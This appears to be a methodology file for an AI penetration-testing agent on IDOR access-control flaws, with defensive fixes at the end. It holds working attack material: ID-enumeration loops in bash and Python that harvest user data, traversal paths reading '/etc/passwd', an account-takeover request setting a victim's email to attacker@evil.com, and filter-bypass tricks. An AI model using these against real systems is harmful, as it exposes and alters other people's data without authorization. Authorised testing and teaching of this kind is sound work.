---
name: idor-testing
description: Professional skills and methodology for IDOR (Insecure Direct Object Reference) testing
version: 1.0.0
---

# IDOR (Insecure Direct Object Reference) Testing

## Overview

IDOR (Insecure Direct Object Reference) is an access control vulnerability that occurs when an application directly uses user-supplied input to access a resource without verifying whether the user is authorized to access it. This skill provides methods for detecting, exploiting, and preventing IDOR vulnerabilities.

## Vulnerability Mechanics

The application references resources directly using predictable identifiers (such as IDs or file names) without verifying whether the current user is authorized to access the resource.

**Dangerous code example:**
```php
// 直接使用用户输入的ID
$file = file_get_contents('/files/' . $_GET['id'] . '.pdf');
```

## Testing Methodology

### 1. Identify Direct Object References

**Common resource types:**
- User IDs
- File IDs/file names
- Order IDs
- Document IDs
- Account IDs
- Record IDs

**Common locations:**
- URL parameters
- POST data
- Cookie values
- HTTP headers
- File paths

### 2. Enumeration Testing

**Sequential ID testing:**
```
/user?id=1
/user?id=2
/user?id=3
```

**UUID testing:**
```
/user?id=550e8400-e29b-41d4-a716-446655440000
/user?id=550e8400-e29b-41d4-a716-446655440001
```

**File name testing:**
```
/files/document1.pdf
/files/document2.pdf
/files/invoice_2024_001.pdf
```

### 3. Horizontal Privilege Testing

**Accessing other users' resources:**
```
当前用户ID: 100
测试: /user?id=101
测试: /user?id=102
```

**Accessing other users' files:**
```
/files/user100_document.pdf
测试: /files/user101_document.pdf
```

### 4. Vertical Privilege Testing

**A regular user accessing admin resources:**
```
/admin/users?id=1
/admin/settings
/admin/logs
```

## Exploitation Techniques

### User Information Leakage

**Enumerating user profiles:**
```bash
# 顺序枚举
for i in {1..1000}; do
  curl "https://target.com/user?id=$i"
done

# 观察响应差异
```

### File Access

**Accessing other users' files:**
```
/files/invoice_12345.pdf
/files/report_67890.pdf
/files/contract_11111.pdf
```

**Combined with directory traversal:**
```
/files/../admin/config.php
/files/../../etc/passwd
```

### Data Modification

**Modifying other users' data:**
```http
POST /api/user/update
Content-Type: application/json

{
  "id": 101,
  "email": "attacker@evil.com"
}
```

### Bulk Operations

**Bulk data retrieval:**
```python
import requests

for user_id in range(1, 1000):
    response = requests.get(f'https://target.com/api/user/{user_id}')
    if response.status_code == 200:
        print(f"User {user_id}: {response.json()}")
```

## Bypass Techniques

### ID Obfuscation

**Base64 encoding:**
```
原始ID: 123
编码: MTIz
URL: /user?id=MTIz
```

**Hash values:**
```
原始ID: 123
哈希: 202cb962ac59075b964b07152d234b70
URL: /user?id=202cb962ac59075b964b07152d234b70
```

### Parameter Name Obfuscation

**Using different parameter names:**
```
/user?id=123
/user?uid=123
/user?user_id=123
/user?account=123
```

### HTTP Method Bypass

**Trying different HTTP methods:**
```
GET /user/123
POST /user/123
PUT /user/123
PATCH /user/123
```

### Path Obfuscation

**Trying different paths:**
```
/api/v1/user/123
/api/user/123
/user/123
/users/123
```

## Tool Usage

### Burp Suite

**Using Intruder:**
1. Intercept the request
2. Send it to Intruder
3. Mark the ID parameter
4. Use a number sequence or a custom list
5. Observe response differences

**Using Repeater:**
1. Manually modify the ID
2. Test different values
3. Observe the responses

### OWASP ZAP

```bash
# 使用ZAP进行IDOR扫描
zap-cli active-scan --scanners all http://target.com
```

### Python Script

```python
import requests
import json

def test_idor(base_url, user_id_range):
    for user_id in user_id_range:
        url = f"{base_url}/user?id={user_id}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            print(f"User {user_id}: {data.get('email', 'N/A')}")

test_idor("https://target.com", range(1, 100))
```

## Verification and Reporting

### Verification Steps

1. Confirm that unauthorized resources can be accessed
2. Verify that other users' data can be read, modified, or deleted
3. Assess the impact (data leakage, privacy violations, etc.)
4. Document a complete PoC
5. Use the `report_finding` tool to record confirmed vulnerabilities in the platform (the sole entry point for recording vulnerabilities in this platform); the fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Report Essentials

- Vulnerability location and resource identifiers
- The unauthorized resources that can be accessed
- Complete exploitation steps and PoC
- Remediation recommendations (access control, resource mapping, etc.)

## Protective Measures

### Recommended Solutions

1. **Access control validation**
   ```python
   def get_user_data(user_id, current_user_id):
       # 验证权限
       if user_id != current_user_id:
           raise PermissionDenied("Cannot access other user's data")
       
       # 返回数据
       return db.get_user(user_id)
   ```

2. **Indirect object references**
   ```python
   # 使用映射表
   user_mapping = {
       'abc123': 100,
       'def456': 101,
       'ghi789': 102
   }
   
   def get_user(mapped_id):
       real_id = user_mapping.get(mapped_id)
       if not real_id:
           raise NotFound()
       return db.get_user(real_id)
   ```

3. **Role-based access control**
   ```python
   def check_permission(user, resource):
       if user.role == 'admin':
           return True
       if resource.owner_id == user.id:
           return True
       return False
   ```

4. **Resource ownership validation**
   ```python
   def update_user_data(user_id, data, current_user):
       user = db.get_user(user_id)
       
       # 验证所有权
       if user.id != current_user.id and current_user.role != 'admin':
           raise PermissionDenied()
       
       # 更新数据
       db.update_user(user_id, data)
   ```

5. **Use unpredictable identifiers**
   ```python
   import uuid
   
   # 使用UUID替代顺序ID
   resource_id = str(uuid.uuid4())
   ```

6. **Principle of least privilege**
   - Only return data the user is authorized to access
   - Use data filtering
   - Limit the scope of accessible resources

## Important Notes

- Only test in authorized testing environments
- Avoid accessing or modifying real user data
- Be aware of access control differences across resources
- Watch your request rate during testing to avoid triggering protections
